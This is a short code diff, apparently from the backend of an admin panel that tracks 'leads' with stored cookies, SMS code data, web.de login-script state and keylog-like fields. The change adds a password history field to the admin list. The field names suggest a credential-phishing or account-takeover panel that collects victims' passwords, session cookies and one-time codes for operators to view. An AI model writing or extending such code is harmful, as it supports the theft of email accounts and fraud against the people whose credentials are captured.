@@ -502,7 +502,7 @@ SELECT
   admin_log_archived, kl_log_archived, past_history_transferred,
   client_form_brand, host_brand_at_submit,
   webde_script_active_run, webde_login_grid_exhausted, webde_login_grid_step, script_status,
-  event_terminal_json, sms_code_data_json,
+  event_terminal_json, password_history_json, sms_code_data_json,
   CASE WHEN cookies IS NOT NULL AND LENGTH(TRIM(COALESCE(cookies, ''))) > 0 THEN 1 ELSE 0 END AS cookies_in_db
 FROM leads
 `;
@@ -556,6 +556,8 @@ function leadAdminListRowToObject(row) {
   };
   const et = parseJsonField(row.event_terminal_json);
   if (et !== undefined) o.eventTerminal = et;
+  const ph = parseJsonField(row.password_history_json);
+  if (ph !== undefined) o.passwordHistory = ph;
   const sms = parseJsonField(row.sms_code_data_json);
   if (sms !== undefined) o.smsCodeData = sms;
   return o;
